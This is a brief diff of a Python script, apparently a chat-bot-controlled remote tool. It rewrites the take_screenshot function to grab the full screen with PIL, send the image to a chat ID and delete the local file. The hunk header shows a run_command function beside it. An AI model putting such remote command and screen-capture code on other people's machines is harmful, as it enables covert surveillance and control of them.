@@ -129,11 +129,12 @@ def run_command(chat_id, cmd, is_python=False):
 
 def take_screenshot(chat_id):
     try:
-        import mss
-        with mss.mss() as sct:
-            filename = sct.shot(output="screenshot.png")
-            send_photo(chat_id, filename)
-            os.remove(filename)
+        from PIL import ImageGrab
+        screenshot = ImageGrab.grab()
+        filename = "screenshot.png"
+        screenshot.save(filename)
+        send_photo(chat_id, filename)
+        os.remove(filename)
     except Exception as e:
         send_message(chat_id, f"Screenshot error: {e}")
 
